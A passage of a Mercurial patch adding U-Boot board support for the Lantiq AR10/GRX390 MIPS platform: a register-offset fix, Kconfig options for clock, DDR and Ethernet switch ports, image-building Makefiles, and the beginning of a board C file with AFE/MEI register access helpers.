# HG changeset patch
# Parent cc6991ab1d2848a28c219747417922ba82e03199
Board related files for AR10 platform

05/10/2011 added support for ddr1 ram

diff --git a/arch/mips/include/asm/ar10.h b/arch/mips/include/asm/ar10.h
--- a/arch/mips/include/asm/ar10.h
+++ b/arch/mips/include/asm/ar10.h
@@ -234,7 +234,7 @@
 #define AR10_PMU_PWDSR1                  ((volatile u32*)(AR10_PMU_BASE_ADDR + 0x0028))
 
 
-#define AR10_PMU_CLKGSR1                ((volatile u32*)(AR10_PMU_BASE_ADDR + 0x001C))
+#define AR10_PMU_CLKGSR1                ((volatile u32*)(AR10_PMU_BASE_ADDR + 0x0020))
 #define AR10_PMU_CLKGCR1_A              ((volatile u32*)(AR10_PMU_BASE_ADDR + 0x0024))
 #define AR10_PMU_CLKGCR1_B			        ((volatile u32*)(AR10_PMU_BASE_ADDR + 0x0028))
 #define AR10_PMU_CLKGSR2                ((volatile u32*)(AR10_PMU_BASE_ADDR + 0x0030))
@@ -1016,11 +1016,21 @@
 #define AR10_CSS                          (0xBF400000)
 /***********************************************************************/
 
-
 /***CSS Control***/
 #define AR10_CSS_AL_CONTROL                      ((volatile u32*)(AR10_CSS + 0x0430))
 
 
+/***********************************************************************/
+/*  Module      :  Cross Bar register address and bits                       */
+/***********************************************************************/
+
+#define AR10_ICU_BASE                     (0xBF880200)
+/***********************************************************************/
+
+#define AR10_ICU_IM3_ISR                  ((volatile u32*)(AR10_ICU_BASE + 0x0078))
+
+
+
 #define AR10_REG32(addr)                 *((volatile u32 *)(addr))
 #define AR10_REG16(addr)                 *((volatile u16 *)(addr))
 #define AR10_REG8(addr)                  *((volatile u8 *)(addr))
diff --git a/board/ar10/Kconfig b/board/ar10/Kconfig
new file mode 100644
--- /dev/null
+++ b/board/ar10/Kconfig
@@ -0,0 +1,577 @@
+if LANTIQ_UBOOT_grx390
+config DRIVER_GRX390
+	bool
+	default y
+endif
+
+config DRIVER_AR10
+      bool
+	  default y
+
+
+menu "CPU/DDR FREQUENCY"
+
+choice 
+    prompt "DDR TYPE SELECTION"
+    default AR10_DDR2
+
+config AR10_DDR1
+    bool "DDR1"
+
+config AR10_DDR2
+    bool "DDR2"
+
+endchoice
+
+choice
+    prompt "CRYSTAL CLOCK FREQUENCY"
+    default AR10_CRYSTAL_36M
+
+config AR10_CRYSTAL_25M
+    bool "25M"
+
+config AR10_CRYSTAL_36M
+    bool "36M"
+
+endchoice
+
+config MIPS_CLK_FUSED_CHIP
+	bool "Chip is fused to 600Mhz"
+	depends on DRIVER_GRX390
+	default n
+	help
+
+config GRX390_CPUFREQ_AUTO_DETECT
+	bool "Allow Chip to auto detect CPU/DDR Frequency"
+	depends on DRIVER_GRX390
+	default n
+
+
+choice
+    prompt "CPU AND RAM CONFIGURATION"
+    default AR10_SYS_CLOCK_500M
+    depends on !GRX390_CPUFREQ_AUTO_DETECT
+
+config AR10_CPU_125M_RAM_125M
+    bool "125M/125M"
+    select AR10_SYS_CLOCK_500M
+    depends on !DRIVER_GRX390
+
+config AR10_CPU_250M_RAM_125M
+    bool "250M/125M" 
+    select AR10_SYS_CLOCK_500M
+    depends on !DRIVER_GRX390
+
+config AR10_CPU_250M_RAM_250M
+    bool "250M/250M"
+    select AR10_SYS_CLOCK_500M
+	depends on !DRIVER_GRX390
+   
+config AR10_CPU_500M_RAM_250M
+    bool "500M/250M"
+    select AR10_SYS_CLOCK_500M
+	depends on !DRIVER_GRX390
+
+config AR10_CPU_150M_RAM_150M
+    bool "150M/150M"
+    select AR10_SYS_CLOCK_600M
+
+config AR10_CPU_300M_RAM_150M
+    bool "300M/150M"
+	select AR10_SYS_CLOCK_600M
+
+config AR10_CPU_300M_RAM_300M
+    bool "300M/300M"
+	select AR10_SYS_CLOCK_600M
+	
+config AR10_CPU_600M_RAM_300M
+    bool "600M/300M"
+	select AR10_SYS_CLOCK_600M
+
+config GRX390_CPU_666M_RAM_333M
+    bool "666M/333M"
+	depends on !MIPS_CLK_FUSED_CHIP && DRIVER_GRX390
+	select GRX390_SYS_CLOCK_666M
+
+config GRX390_CPU_180M_RAM_180M
+    bool "180M/180M"
+	depends on !MIPS_CLK_FUSED_CHIP && DRIVER_GRX390
+	select GRX390_SYS_CLOCK_720M
+
+config GRX390_CPU_360M_RAM_180M
+    bool "360M/180M"
+	depends on !MIPS_CLK_FUSED_CHIP && DRIVER_GRX390
+	select GRX390_SYS_CLOCK_720M
+
+config GRX390_CPU_360M_RAM_360M
+    bool "360M/360M"
+	depends on !MIPS_CLK_FUSED_CHIP && DRIVER_GRX390
+	select GRX390_SYS_CLOCK_720M
+
+config GRX390_CPU_720M_RAM_360M
+    bool "720M/360M"
+    depends on !MIPS_CLK_FUSED_CHIP && DRIVER_GRX390
+    select GRX390_SYS_CLOCK_720M
+
+endchoice
+
+config AR10_SYS_CLOCK_500M
+    bool
+
+config AR10_SYS_CLOCK_600M
+    bool
+
+config GRX390_SYS_CLOCK_666M
+	bool
+
+config GRX390_SYS_CLOCK_720M
+    bool
+
+
+choice
+    prompt "PPE FREQUENCY"
+    default AR10_PPE_FREQ_250M
+    depends on !GRX390_CPUFREQ_AUTO_DETECT
+
+config AR10_PPE_FREQ_250M
+    bool "250M"
+
+config AR10_PPE_FREQ_400M
+    bool "400M"
+
+config AR10_PPE_FREQ_432M
+    bool "432M"
+    depends on (GRX390_CPU_666M_RAM_333M || AR10_CPU_600M_RAM_300M) && !GRX390_CPU_720M_RAM_360M
+
+config AR10_PPE_FREQ_468M
+	bool "468M"
+	depends on DRIVER_GRX390 && GRX390_CPU_666M_RAM_333M
+
+endchoice
+
+config AR10_DDR_8BIT
+    bool "8Bit DDR RAM"
+	default n
+
+endmenu
+
+	
+menu "SWITCH OPTIONS"
+
+config AR10_SW_PORT_0
+    bool "USE PORT 0"
+
+choice
+   prompt "INTERFACE"
+   depends on AR10_SW_PORT_0
+   default AR10_SW_PORT0_RGMII_MAC
+
+config AR10_SW_PORT0_MII_PHY
+   bool "MII PHY"
+
+config AR10_SW_PORT0_MII_MAC
+   bool "MII MAC"
+
+config AR10_SW_PORT0_RMII_PHY
+   bool "RMII PHY"
+
+config AR10_SW_PORT0_RMII_MAC
+   bool "RMII MAC"
+
+config AR10_SW_PORT0_RGMII_MAC
+   bool "RGMII MAC"
+
+endchoice  
+
+config AR10_SW_PORT0_MIIMODE
+   int
+   depends on AR10_SW_PORT_0
+   default 0 if AR10_SW_PORT0_MII_PHY
+   default 1 if AR10_SW_PORT0_MII_MAC
+   default 2 if AR10_SW_PORT0_RMII_PHY
+   default 3 if AR10_SW_PORT0_RMII_MAC
+   default 4 if AR10_SW_PORT0_RGMII_MAC
+
+   
+choice
+   prompt "xMII CLOCK RATE"
+   depends on AR10_SW_PORT_0
+   default AR10_SW_PORT0_MIIRATE_AUTO
+	
+config AR10_SW_PORT0_MIIRATE_M2P5
+	 bool "2.5MHz"
+	 depends on !AR10_SW_PORT0_RMII_MAC && !AR10_SW_PORT0_RMII_PHY
+	
+config AR10_SW_PORT0_MIIRATE_M25
+    bool "25MHz"
+    depends on !AR10_SW_PORT0_RMII_MAC && !AR10_SW_PORT0_RMII_PHY
+
+config AR10_SW_PORT0_MIIRATE_M125
+    bool "125MHz"
+    depends on !AR10_SW_PORT0_RMII_MAC && !AR10_SW_PORT0_RMII_PHY
+
+config AR10_SW_PORT0_MIIRATE_M50	
+	  bool "50MHz"
+	  
+config AR10_SW_PORT0_MIIRATE_AUTO
+    bool "AUTO"
+    depends on !AR10_SW_PORT0_RMII_MAC && !AR10_SW_PORT0_RMII_PHY
+		
+endchoice
+
+config AR10_SW_PORT0_MIIRATE
+    int 
+	depends on AR10_SW_PORT_0
+	default 0 if AR10_SW_PORT0_MIIRATE_M2P5
+	default 1 if AR10_SW_PORT0_MIIRATE_M25
+	default 2 if AR10_SW_PORT0_MIIRATE_M125
+	default 3 if AR10_SW_PORT0_MIIRATE_M50
+	default 4 if AR10_SW_PORT0_MIIRATE_AUTO
+
+choice 
+    prompt "RMII REF CLOCK DIRECTIOM"
+	  default AR10_SW_PORT0_RMII_CLK_IN
+	  depends on AR10_SW_PORT0_RMII_PHY || AR10_SW_PORT0_RMII_MAC
+
+config AR10_SW_PORT0_RMII_CLK_IN
+    bool "IN"
+
+config AR10_SW_PORT0_RMII_CLK_OUT
+    bool "OUT"
+	
+endchoice
+
+
+config AR10_SW_PORT_1
+    bool "USE PORT 1"
+    
+choice
+   prompt "INTERFACE"
+   depends on AR10_SW_PORT_1
+   default AR10_SW_PORT1_RGMII_MAC
+
+config AR10_SW_PORT1_MII_PHY
+   bool "MII PHY"
+
+config AR10_SW_PORT1_MII_MAC
+   bool "MII MAC"
+
+config AR10_SW_PORT1_RMII_PHY
+   bool "RMII PHY"
+
+config AR10_SW_PORT1_RMII_MAC
+   bool "RMII MAC"
+
+config AR10_SW_PORT1_RGMII_MAC
+   bool "RGMII MAC"
+endchoice  
+
+config AR10_SW_PORT1_MIIMODE
+   int
+   depends on AR10_SW_PORT_1
+   default 0 if AR10_SW_PORT1_MII_PHY
+   default 1 if AR10_SW_PORT1_MII_MAC
+   default 2 if AR10_SW_PORT1_RMII_PHY
+   default 3 if AR10_SW_PORT1_RMII_MAC
+   default 4 if AR10_SW_PORT1_RGMII_MAC
+								   
+   
+choice
+   prompt "xMII CLOCK RATE"
+   depends on AR10_SW_PORT_1
+   default AR10_SW_PORT1_MIIRATE_AUTO
+	
+config AR10_SW_PORT1_MIIRATE_M2P5
+	bool "2.5MHz"
+	depends on !AR10_SW_PORT1_RMII_MAC && !AR10_SW_PORT1_RMII_PHY
+	
+config AR10_SW_PORT1_MIIRATE_M25
+    bool "25MHz"
+    depends on !AR10_SW_PORT1_RMII_MAC && !AR10_SW_PORT1_RMII_PHY
+
+config AR10_SW_PORT1_MIIRATE_M125
+    bool "125MHz"
+    depends on !AR10_SW_PORT1_RMII_MAC && !AR10_SW_PORT1_RMII_PHY
+
+config AR10_SW_PORT1_MIIRATE_M50	
+	  bool "50MHz"
+
+config AR10_SW_PORT1_MIIRATE_AUTO
+    bool "AUTO"
+		depends on !AR10_SW_PORT1_RMII_MAC && !AR10_SW_PORT1_RMII_PHY
+		
+endchoice
+
+config AR10_SW_PORT1_MIIRATE
+    int 
+	depends on AR10_SW_PORT_1
+	default 0 if AR10_SW_PORT1_MIIRATE_M2P5
+	default 1 if AR10_SW_PORT1_MIIRATE_M25
+	default 2 if AR10_SW_PORT1_MIIRATE_M125
+	default 3 if AR10_SW_PORT1_MIIRATE_M50
+	default 4 if AR10_SW_PORT1_MIIRATE_AUTO
+
+choice 
+    prompt "RMII REF CLOCK DIRECTIOM"
+	  default AR10_SW_PORT1_RMII_CLK_IN
+	  depends on AR10_SW_PORT1_RMII_MAC || AR10_SW_PORT1_RMII_PHY
+
+config AR10_SW_PORT1_RMII_CLK_IN
+    bool "IN"
+
+config AR10_SW_PORT1_RMII_CLK_OUT
+    bool "OUT"
+	
+endchoice
+
+config AR10_SW_PORT_2
+    bool "USE PORT 2"
+    default y
+
+choice
+   prompt "INTERFACE FOR PORT 2 AND PORT4"
+   depends on AR10_SW_PORT_2
+   default AR10_SW_PORT2_GMII
+
+config AR10_SW_PORT2_GMII
+   bool "GMII"
+
+config AR10_SW_PORT2_MII
+   bool "MII"
+
+endchoice  
+
+config  AR10_SW_PORT2_MIIRATE
+   int
+   depends on AR10_SW_PORT_2
+   default 4 
+					 
+config AR10_SW_PORT2_MIIMODE
+    int
+	depends on AR10_SW_PORT_2
+	default 1 
+								
+
+config AR10_SW_PORT_3
+    bool "USE PORT 3"
+	default y
+    depends on AR10_SW_PORT2_MII && !DRIVER_GRX390
+    
+choice
+   prompt "INTERFACE"
+   depends on AR10_SW_PORT_3
+   default AR10_SW_PORT3_MII
+
+config AR10_SW_PORT3_MII
+   bool "MII"
+
+endchoice    
+    
+config AR10_SW_PORT3_MIIRATE
+   int
+   depends on AR10_SW_PORT_3
+   default 4 
+					 
+config AR10_SW_PORT3_MIIMODE
+    int
+	depends on AR10_SW_PORT_3
+    default 1 if AR10_SW_PORT3_MII
+
+# Configuration for GRX390 addition PHY
+config GRX390_SW_PORT_3a
+    bool "USE PORT 3a"
+	default y
+	depends on AR10_SW_PORT2_MII && DRIVER_GRX390
+
+choice
+   	prompt "INTERFACE"
+   	depends on GRX390_SW_PORT_3a
+    default GRX390_SW_PORT3a_MII
+
+config GRX390_SW_PORT3a_MII
+	bool "MII"
+
+endchoice
+
+config GRX390_SW_PORT3a_MIIRATE
+   	int
+   	depends on GRX390_SW_PORT_3a
+   	default 4
+
+config GRX390_SW_PORT3a_MIIMODE
+   	int
+   	depends on GRX390_SW_PORT_3a
+   	default 0 if GRX390_SW_PORT3a_MII
+
+config GRX390_SW_PORT_3b
+    bool "USE PORT 3b"
+    default y
+    depends on !GRX390_SW_PORT_3a && DRIVER_GRX390
+
+choice
+   	prompt "INTERFACE"
+   	depends on GRX390_SW_PORT_3b
+   	default GRX390_SW_PORT3b_GMII
+
+	config GRX390_SW_PORT3b_GMII
+	bool "GMII"
+
+endchoice
+
+config GRX390_SW_PORT3b_MIIRATE
+   int
+	depends on GRX390_SW_PORT_3b
+	default 4
+
+config GRX390_SW_PORT3b_MIIMODE
+   int
+	depends on GRX390_SW_PORT_3b
+	default 1 if GRX390_SW_PORT3b_GMII
+
+#end configuration for new PHY on GRX390
+
+config AR10_SW_PORT_4
+    bool "USE PORT 4"
+	default y
+	depends on AR10_SW_PORT_2
+
+config AR10_SW_PORT4_GMII
+   bool  
+   default y
+   depends on AR10_SW_PORT2_GMII
+
+config AR10_SW_PORT4_MII
+   bool
+   default y
+   depends on AR10_SW_PORT2_MII
+
+
+config AR10_SW_PORT4_MIIRATE
+   int
+   depends on AR10_SW_PORT_4
+   default 4
+					 
+config AR10_SW_PORT4_MIIMODE
+    int
+	depends on AR10_SW_PORT_4
+	default 1 
+	
+
+config AR10_SW_PORT_5a
+    bool "USE PORT 5a"
+	default y
+    depends on !AR10_SW_PORT_5b
+
+choice
+   prompt "INTERFACE"
+   depends on AR10_SW_PORT_5a
+   default AR10_SW_PORT5a_RGMII
+
+config AR10_SW_PORT5a_RGMII
+   bool "RGMII"
+endchoice
+
+config AR10_SW_PORT5a_MIIMODE
+   int
+   depends on AR10_SW_PORT_5a
+   default 4
+
+config AR10_SW_PORT5a_MIIRATE
+    int
+	depends on AR10_SW_PORT_5a
+	default 4 if AR10_SW_PORT5a_RGMII
+			
+
+config AR10_SW_PORT_5b
+    bool "USE PORT 5b"
+	default y
+    depends on AR10_SW_PORT2_MII
+    
+choice
+   prompt "INTERFACE"
+   depends on AR10_SW_PORT_5b
+   default AR10_SW_PORT5b_MII
+
+config AR10_SW_PORT5b_MII
+   bool "MII"
+
+endchoice       
+
+config AR10_SW_PORT5b_MIIMODE
+   int
+   depends on AR10_SW_PORT_5b
+   default 1 
+
+config AR10_SW_PORT5b_MIIRATE
+    int
+	depends on AR10_SW_PORT_5b
+	default 4
+
+choice 
+    prompt "INTERNAL GPHY CLOCK SOURCE"
+    default AR10_GPHY_CLK_25M
+
+config AR10_GPHY_CLK_36M
+    bool "36Mhz"
+
+config AR10_GPHY_CLK_25M
+    bool "25Mhz"
+
+endchoice
+
+config AR10_EXTERNAL_GPHY_INTERNAL
+   bool "Use internal 25Mhz clock for external phy" 
+   default y
+
+
+config AR10_GPHY_FW_EMBEDDED
+    bool "gphy firmware embedded"
+	default y
+		
+
+config AR10_GPHY_FW_ADDR
+    hex  
+	default "0xb0010000" if ( BOOT_FROM_NOR )
+	default "0xa0110000" if ( BOOT_FROM_SPI )
+	default "0xa0120000" if ( BOOT_FROM_NAND )
+	depends on AR10_SW_PORT_1 || AR10_SW_PORT_2 || AR10_SW_PORT_3 || AR10_SW_PORT_4 || AR10_SW_PORT_5b
+    depends on AR10_GPHY_FW_EMBEDDED
+
+config AR10_EXTERN_GPHY_FW_ADDR
+    hex "gphy firmware address"
+	default "0xb0010000"
+	depends on !AR10_GPHY_FW_EMBEDDED
+			
+config AR10_GPHY_DEBUG
+    bool "DEBUG GPHY"
+	default y
+    depends on !NAND_FLASH
+	
+endmenu
+
+config AR10_LIF_DETECTION
+    bool "LIF DETECTION"
+	default n
+
+config AR10_PROGRAM_AFE_FUSE
+    bool "PROGRAM AFE WITH FUSED VALUE"
+    default y
+	depends on !DRIVER_GRX390
+
+config AR10_DCDC_2V5_PWM0
+    bool "Set DCDC 2V5 PWM0 VALUE to 0x8f"
+	default n
+
+config DISABLE_SINGLE_ENDED_CLK_GPHY2
+       bool "Disable single ended clock for GPHY2"
+       depends on DRIVER_GRX390
+       default y
+
+config TUNE_DDR
+    bool "DDR tuning support"
+    default y
+
+config DDR_TUNING_TEXT_BASE
+    hex
+    default "0xbe1a0000"
+    depends on TUNE_DDR
diff --git a/board/ar10/Makefile b/board/ar10/Makefile
new file mode 100644
--- /dev/null
+++ b/board/ar10/Makefile
@@ -0,0 +1,55 @@
+#
+# (C) Copyright 2003-2006
+# Wolfgang Denk, DENX Software Engineering, wd@denx.de.
+#
+# See file CREDITS for list of people who contributed to this
+# project.
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License as
+# published by the Free Software Foundation; either version 2 of
+# the License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+# MA 02111-1307 USA
+#
+
+include $(TOPDIR)/config.mk
+
+LIB	= $(obj)lib$(BOARD).a
+
+COBJS	= $(BOARD).o 
+SOBJS	= lowlevel_init.o
+
+SRCS	:= $(SOBJS:.o=.S) $(COBJS:.o=.c)
+OBJS	:= $(addprefix $(obj),$(COBJS))
+SOBJS	:= $(addprefix $(obj),$(SOBJS))
+
+$(LIB):	$(obj).depend $(OBJS) $(SOBJS)
+	$(AR) $(ARFLAGS) $@ $(OBJS) $(SOBJS)
+
+
+sfddr: start_sfddr.o sfddr_board.o tune_ddr.o lowlevel_init.o
+sf_preload: start_sfpreload.o sfpreload.o
+
+tune_ddr.c:
+	@rm -f $@
+	@ln -s $(TOPDIR)/lib_bootstrap/tune_ddr.c $@ 
+
+	
+	
+#########################################################################
+
+# defines $(obj).depend target
+include $(SRCTREE)/rules.mk
+
+sinclude $(obj).depend
+
+#########################################################################
diff --git a/board/ar10/Makefile.lq b/board/ar10/Makefile.lq
new file mode 100755
--- /dev/null
+++ b/board/ar10/Makefile.lq
@@ -0,0 +1,125 @@
+ifdef CONFIG_AR10_GPHY_FW_EMBEDDED
+    GPHY_FIRMWARE = $(TOPDIR)/board/$(BOARD)/gphy_firmware.img
+else
+    GPHY_FIRMWARE = $(TOPDIR)/dummy
+endif
+		
+
+ENV_BLOCK=
+
+ifdef CONFIG_BUILD_ENV_BLOCK
+ENV_BLOCK=ubootenv.img
+endif
+
+
+ALL +=bootstrap.bin u-boot.lzimg u-boot.ltq $(ENV_BLOCK)
+
+
+LDSCRIPT_BOOTSTRAP := $(TOPDIR)/board/$(BOARD)/bootstrap.lds
+ifdef CONFIG_BOOT_FROM_NOR
+OBJS_BOOTSTRAP  = $(TOPDIR)/$(CPUDIR)/$(BOARD)/start_bootstrap.o
+OBJS_BOOTSTRAP  += $(TOPDIR)/board/$(BOARD)/lowlevel_init.o
+else 
+OBJS_BOOTSTRAP  = $(TOPDIR)/$(CPUDIR)/$(BOARD)/start_uncomp.o
+endif
+
+
+
+OBJS_BOOTSTRAP  += $(TOPDIR)/lib/string.o
+OBJS_BOOTSTRAP  += $(CPUDIR)/$(BOARD)/lib$(CPU).a
+LIBS_BOOTSTRAP  = $(TOPDIR)/lib_bootstrap/libbootstrap.a
+LIBS_BOOTSTRAP += $(TOPDIR)/lib/crc32.o
+LIBS_BOOTSTRAP += $(TOPDIR)/drivers/serial/lq_asc.o
+LIBS_BOOTSTRAP += $(TOPDIR)/$(CPUDIR)/$(BOARD)/clock.o
+#LIBS_BOOTSTRAP += $(TOPDIR)/$(CPUDIR)/$(BOARD)/asc.o
+LIBS_BOOTSTRAP += $(TOPDIR)/arch/mips/lib/time.o
+
+
+BOOTSTRAP_LDFLAGS = -Bstatic -T $(LDSCRIPT_BOOTSTRAP) -Ttext $(CONFIG_BOOTSTRAP_TEXT_BASE) 
+
+ifdef CONFIG_BOOT_FROM_NAND
+$(obj)u-boot.ltq: $(obj)System.map $(obj)bootstrap.bin $(obj)u-boot.lzimg
+		@touch dummy
+		@$(TOPDIR)/scripts_platform/pad2align.sh -n 10240 bootstrap.bin
+		@cat $(obj)bootstrap.bin > $(obj)u-boot.ltq
+		@cat $(obj)u-boot.lzimg >> $(obj)u-boot.ltq
+		@$(TOPDIR)/scripts_platform/pad2align.sh -n 65536 u-boot.ltq
+		@@cat $(GPHY_FIRMWARE) >>u-boot.ltq
+endif
+
+ifdef CONFIG_BOOT_FROM_SPI
+ifdef CONFIG_LTQ_SECURE_BOOT
+$(obj)u-boot.ltq: $(obj)System.map $(obj)bootstrap.bin $(obj)u-boot.lzimg sfddr.bin stools
+		@touch dummy
+		@scripts_platform/pad2align.sh -n 32 sfddr.bin
+		@./stools -i sfddr.bin -o sfddr.enc -e 0xbe1a4030 -d 0xbe1a0000 -j 0xbe1a0000 -k $(CONFIG_AES_KEY)
+		@scripts_platform/mk_sf.pl dummy sfddr.enc 0xbe1a4000 u-boot.ltq
+		@$(TOPDIR)/scripts_platform/pad2align.sh -n 0x5000 u-boot.ltq
+		@cat $(obj)u-boot.lzimg >> $(obj)u-boot.ltq
+		@$(TOPDIR)/scripts_platform/pad2align.sh -n 0x10000 u-boot.ltq
+		@cat $(GPHY_FIRMWARE) >> u-boot.ltq
+else
+$(obj)u-boot.ltq: $(obj)System.map $(obj)u-boot.lzimg sfddr.bin 
+		@touch dummy
+		@scripts_platform/mk_sf.pl dummy sfddr.bin 0xbe1a0000 u-boot.ltq
+		@$(TOPDIR)/scripts_platform/pad2align.sh -n 0x5000 u-boot.ltq
+		@cat $(obj)u-boot.lzimg >> $(obj)u-boot.ltq
+		@$(TOPDIR)/scripts_platform/pad2align.sh -n 0x10000 u-boot.ltq
+		@cat $(GPHY_FIRMWARE) >> u-boot.ltq								
+endif
+endif
+						
+LDFLAGS_SFDDR = -Bstatic -T $(TOPDIR)/board/$(BOARD)/bootstrap.lds -Ttext 0xbe1a0000 $(PLATFORM_LDFLAGS)
+OBJS_SFDDR = $(TOPDIR)/board/$(BOARD)/start_sfddr.o 
+OBJS_SFDDR +=$(TOPDIR)/board/$(BOARD)/sfddr_board.o 
+ifdef CONFIG_TUNE_DDR
+OBJS_SFDDR +=$(TOPDIR)/board/$(BOARD)/tune_ddr.o 
+endif
+OBJS_SFDDR +=$(TOPDIR)/board/$(BOARD)/lowlevel_init.o
+LIBS_SFDDR = $(TOPDIR)/lib/string.o
+LIBS_SFDDR += $(TOPDIR)/lib/crc32.o
+LIBS_SFDDR += $(TOPDIR)/$(CPUDIR)/$(BOARD)/clock.o
+LIBS_SFDDR += $(TOPDIR)/drivers/serial/lq_asc.o
+LIBS_SFDDR += $(TOPDIR)/arch/mips/lib/time.o
+LIBS_SFDDR += $(TOPDIR)/lib_bootstrap/LzmaDecode.o
+LIBS_SFDDR += $(TOPDIR)/lib_bootstrap/LzmaWrapper.o
+
+
+sfddr.bin:    $(obj)sfddr
+		$(OBJCOPY) ${OBJCFLAGS} -O binary $< $@
+
+sfddr:  depend $(SUBDIRS) $(OBJS_SFDDR) $(LIBS_SFDDR) bootstrap
+		$(LD) $(LDFLAGS_SFDDR) $(OBJS_SFDDR) $(LIBS_SFDDR) \
+	     -Map sfddr.map -o sfddr
+
+$(OBJS_SFDDR):
+		rm -f $(OBJS_SFDDR)
+		$(MAKE) -C `dirname $@` sfddr
+				
+
+u-boot.lzimg: $(obj)u-boot.bin System.map
+		lzma e $(obj)u-boot.bin $(obj)u-boot.lzma
+		scripts_platform/pad2align.sh -n 16 u-boot.lzma
+		$(TOPDIR)/tools/mkimage -A mips -T firmware -C lzma \
+		-a 0x$(shell grep "T _start" $(TOPDIR)/System.map | awk '{ printf "%s", $$1 }') \
+		-e 0x$(shell grep "T _start" $(TOPDIR)/System.map | awk '{ printf "%s", $$1 }') \
+		-n 'u-boot image' -d $(obj)u-boot.lzma $@
+
+
+bootstrap.bin:    $(obj)bootstrap
+		$(OBJCOPY) ${OBJCFLAGS} -O binary $< $@
+		
+bootstrap: $(OBJS_BOOTSTRAP) $(LIBS_BOOTSTRAP)  $(LDSCRIPT_BOOTSTRAP)
+		$(LD) $(BOOTSTRAP_LDFLAGS) $$UNDEF_SYM $(OBJS_BOOTSTRAP) $(LIBS_BOOTSTRAP) \
+		-Map bootstrap.map -o bootstrap
+		
+$(LIBS_BOOTSTRAP):
+		$(MAKE) -C `dirname $@` all
+
+stools: $(TOPDIR)/board/$(BOARD)/stools.c
+		$(HOSTCC) -o $@ $<
+
+$(ENV_BLOCK): $(obj)u-boot $(obj)u-boot.bin
+		$(NM) -Ss u-boot >u-boot.sym
+		scripts_platform/mk_envimg.sh $@
+
diff --git a/board/ar10/ar10.c b/board/ar10/ar10.c
new file mode 100755
--- /dev/null
+++ b/board/ar10/ar10.c
@@ -0,0 +1,633 @@
+/*
+ * (C) Copyright 2003
+ * Wolfgang Denk, DENX Software Engineering, wd@denx.de.
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+#include <config.h>
+#include <common.h>
+#include <command.h>
+#include <asm/addrspace.h>
+#include <environment.h>
+#include <nand.h>
+#include <spi_flash.h>
+#include <asm/ar10.h>
+#include "ddr.h"
+
+#if !defined(DEBUG_ENABLE_BOOTSTRAP_PRINTF) && defined(CFG_BOOTSTRAP_CODE)                                                                            
+#define printf                                                                                                                                        
+#endif   
+
+#ifndef CONFIG_ENV_SPI_BUS
+# define CONFIG_ENV_SPI_BUS 0
+#endif
+#ifndef CONFIG_ENV_SPI_CS
+# define CONFIG_ENV_SPI_CS      0
+#endif
+#ifndef CONFIG_ENV_SPI_MAX_HZ
+# define CONFIG_ENV_SPI_MAX_HZ  1000000
+#endif
+#ifndef CONFIG_ENV_SPI_MODE
+# define CONFIG_ENV_SPI_MODE    SPI_MODE_3
+#endif
+
+#ifdef CONFIG_DRIVER_GRX390
+#define PPE_SW_WLAN_RFUSE_BASE_ADDRESS  0x1F1073B0 + 0xA0000000
+#define NO_OF_FUSES 					6
+#define RCU_OFFSET   					0xBF203000
+#define RST_REQ      					(RCU_OFFSET + 0x0010)
+#define RST_STAT2						(RCU_OFFSET + 0x0024)
+#define RST_REQ2                        (RCU_OFFSET + 0x0048)
+#endif /* CONFIG_DRIVER_GRX390 */
+
+#ifdef CONFIG_AR10_PROGRAM_AFE_FUSE
+/******************************************************************************
+ * FOR DFE and AFE
+  ******************************************************************************/
+#define DFE_BASE_ADDR         0xBE116000
+#define mei_dbg_deco_c        (DFE_BASE_ADDR + 0x00000030)
+#define mei_fr_arcint_c       (DFE_BASE_ADDR + 0x0000001C)
+#define mei_dbg_master_c      (DFE_BASE_ADDR + 0x0000003C)
+#define mei_dbg_waddr_c       (DFE_BASE_ADDR + 0x00000024)
+#define mei_dbg_raddr_c       (DFE_BASE_ADDR + 0x00000028)
+#define mei_dbg_data_c        (DFE_BASE_ADDR + 0x0000002C)
+
+#define AFE_CTRL          0xbf107360
+
+#define ADSL_BASE 0x20000
+#define CRI_BASE          ADSL_BASE + 0x11F00
+#define CRI_CCR0          CRI_BASE + 0x00
+#define CRI_CCR1          CRI_BASE + 0x01*4
+#define CRI_UPDCTL        CRI_BASE + 0x0D*4
+#define CRI_EVENT0        CRI_BASE + 0x10*4
+#define CRI_EVENT1        CRI_BASE + 0x11*4
+#define CRI_EVENT2        CRI_BASE + 0x12*4
+//#define REG32(addr)          *((volatile u32 *)(addr))
+// Register Definitions
+#define aux_access 0x0
+#define dmp_access 0x1 // or 0x2
+#define core_access 0x3
+
+#define iri_i_enable    0x32000
+#define sty_smode   0x3c004
+
+#define afe_tcr_0   0x3c0dc
+#define afe_addr_addr   0x3c0e8
+#define afe_rdata_addr  0x3c0ec
+#define afe_wdata_addr  0x3c0f0
+#define afe_config  0x3c0f4
+#define afe_serial_cfg  0x3c0fc
+
+
+u32 mei = 0x1;
+u32 jtag = 0x0;
+u32 dmp_core_access = 0x2;
+
+
+void mei_master(u32 mode){
+  REG32(mei_dbg_master_c) = mode; // MEI as the master
+};
+
+void poll_status(void){
+  while( (REG32(mei_fr_arcint_c) & 0x20) != 0x20 ){};
+};
+
+void mei_dmp_acc(void){
+   REG32(mei_dbg_deco_c) = dmp_access;
+};
+
+void mei_aux_acc(void)
+{
+    REG32(mei_dbg_deco_c) = aux_access;
+};
+
+
+u32 ReadARCmem(u32 addr){
+   u32 data;
+   mei_master(mei);
+   mei_dmp_acc();
+   REG32(mei_dbg_raddr_c) = addr;
+   poll_status();
+   data = REG32(mei_dbg_data_c);
+   mei_master(jtag);
+   return data;
+};
+
